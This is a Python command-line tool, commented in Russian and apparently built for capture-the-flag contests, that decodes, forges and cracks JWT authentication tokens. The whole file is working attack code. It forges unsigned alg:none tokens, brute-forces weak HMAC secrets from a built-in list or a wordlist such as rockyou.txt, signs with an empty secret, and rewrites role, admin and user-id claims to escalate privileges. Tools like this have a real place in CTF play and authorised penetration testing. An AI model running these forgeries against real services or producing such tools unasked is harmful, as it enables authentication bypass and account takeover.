#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
jwt_tool.py — разобрать/подделать JWT без внешних библиотек.

  python jwt_tool.py decode "eyJhbGciOi..."
  python jwt_tool.py auto "eyJhbGciOi..."            # alg:none, слабый секрет, claim→admin
  python jwt_tool.py auto "eyJ..." --wordlist rockyou.txt
  python jwt_tool.py forge --secret s3cr3t --sub admin --role admin
  python jwt_tool.py forge --secret s3cr3t --payload '{"user_id":1}'
  python jwt_tool.py forge --alg none --sub admin
  python jwt_tool.py verify --secret s3cr3t "token"
"""
from __future__ import annotations

# Windows: консоль/pipe не должны падать на Unicode (—, →, «», █).
try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import argparse
import base64
import hashlib
import hmac
import json
import sys


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def decode(token: str):
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("это не JWT")
    header = json.loads(b64url_dec(parts[0]))
    payload = json.loads(b64url_dec(parts[1]))
    return header, payload, parts


def sign(header: dict, payload: dict, secret: bytes, alg="HS256") -> str:
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    if alg == "none":
        return f"{h}.{p}."
    if alg == "HS256":
        sig = hmac.new(secret, msg, hashlib.sha256).digest()
    elif alg == "HS384":
        sig = hmac.new(secret, msg, hashlib.sha384).digest()
    elif alg == "HS512":
        sig = hmac.new(secret, msg, hashlib.sha512).digest()
    else:
        raise ValueError(f"не поддерживаю {alg} (только HS256/384/512/none)")
    return f"{h}.{p}.{b64url(sig)}"


def crack_secret(token: str, wordlist: str | None) -> str | None:
    """Подобрать HMAC-секрет: встроенный мини-список + файл словаря."""
    header, payload, parts = decode(token)
    alg = header.get("alg", "HS256")
    if alg not in ("HS256", "HS384", "HS512"):
        return None
    builtin = ["secret", "password", "admin", "key", "jwt", "changeme", "123456",
               "supersecret", "s3cr3t", "innoctf", "innopolis", "ctf"]
    words = list(builtin)
    if wordlist:
        try:
            with open(wordlist, encoding="utf-8", errors="replace") as f:
                words += [l.strip() for l in f if l.strip()]
        except OSError as e:
            print(f"[!] словарь не открылся: {e}")
    msg = f"{parts[0]}.{parts[1]}".encode()
    import base64 as _b64
    sig = parts[2] if len(parts) > 2 else ""
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
    for w in words:
        got = _b64.urlsafe_b64encode(hmac.new(w.encode(), msg, digest).digest()).rstrip(b"=").decode()
        if hmac.compare_digest(got, sig):
            return w
    return None


def auto(token: str, wordlist: str | None, claim: str, value: str):
    header, payload, parts = decode(token)
    print("[+] header :", json.dumps(header, ensure_ascii=False))
    print("[+] payload:", json.dumps(payload, ensure_ascii=False))
    if len(parts) < 3 or not parts[2]:
        print("[!] подписи нет — токен уже без алгоритма?")

    escalated = dict(payload)
    if claim:
        escalated[claim] = value
    else:
        for k in ("role", "is_admin", "admin", "user_id", "sub"):
            if k in escalated:
                escalated[k] = True if k in ("is_admin", "admin") else (
                    "admin" if k in ("role", "sub") else 1)
    print("\n[+] подделанный payload:", json.dumps(escalated, ensure_ascii=False))

    none_tok = sign({"alg": "none", "typ": "JWT"}, escalated, b"", "none")
    print("\n[1] alg:none (если сервер не проверяет alg):")
    print("   ", none_tok)

    secret = crack_secret(token, wordlist)
    if secret:
        print(f"\n[2] секрет найден: {secret!r}")
        tok = sign({"alg": header.get("alg", "HS256"), "typ": "JWT"}, escalated,
                   secret.encode(), header.get("alg", "HS256"))
        print("   ", tok)
        return
    print("\n[2] секрет не подобран (добавь --wordlist rockyou.txt)")

    print("\n[3] тот же payload с пустым секретом (иногда проверка отключена):")
    print("   ", sign({"alg": "HS256", "typ": "JWT"}, escalated, b"", "HS256"))


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("decode")
    d.add_argument("token")

    f = sub.add_parser("forge")
    f.add_argument("--secret", default="")
    f.add_argument("--alg", default="HS256", choices=["HS256", "HS384", "HS512", "none"])
    f.add_argument("--payload", help='JSON целиком, например {"user_id":1}')
    f.add_argument("--sub")
    f.add_argument("--role")
    f.add_argument("--user-id", type=int)

    v = sub.add_parser("verify")
    v.add_argument("--secret", required=True)
    v.add_argument("token")

    a = sub.add_parser("auto", help="decode + alg:none + подбор секрета + эскалация claim")
    a.add_argument("token")
    a.add_argument("--wordlist")
    a.add_argument("--claim", help="какой claim подменить (по умолчанию role/is_admin/...)")
    a.add_argument("--value", default="admin")

    args = ap.parse_args()

    if args.cmd == "auto":
        auto(args.token, args.wordlist, args.claim, args.value)
        return

    if args.cmd == "decode":
        header, payload, parts = decode(args.token)
        print("header:", json.dumps(header, ensure_ascii=False))
        print("payload:", json.dumps(payload, ensure_ascii=False))
        print("signature:", parts[2] if len(parts) > 2 else "(нет)")
        return

    if args.cmd == "verify":
        header, payload, parts = decode(args.token)
        again = sign(header, payload, args.secret.encode(), header.get("alg", "HS256"))
        print("OK" if hmac.compare_digest(again, args.token) else "FAIL")
        return

    # forge
    payload = json.loads(args.payload) if args.payload else {}
    if args.sub:
        payload["sub"] = args.sub
    if args.role:
        payload["role"] = args.role
    if args.user_id is not None:
        payload["user_id"] = args.user_id
    header = {"alg": args.alg, "typ": "JWT"}
    token = sign(header, payload, args.secret.encode(), args.alg)
    print(token)
    print("\n[+] payload:", json.dumps(payload, ensure_ascii=False))


if __name__ == "__main__":
    main()
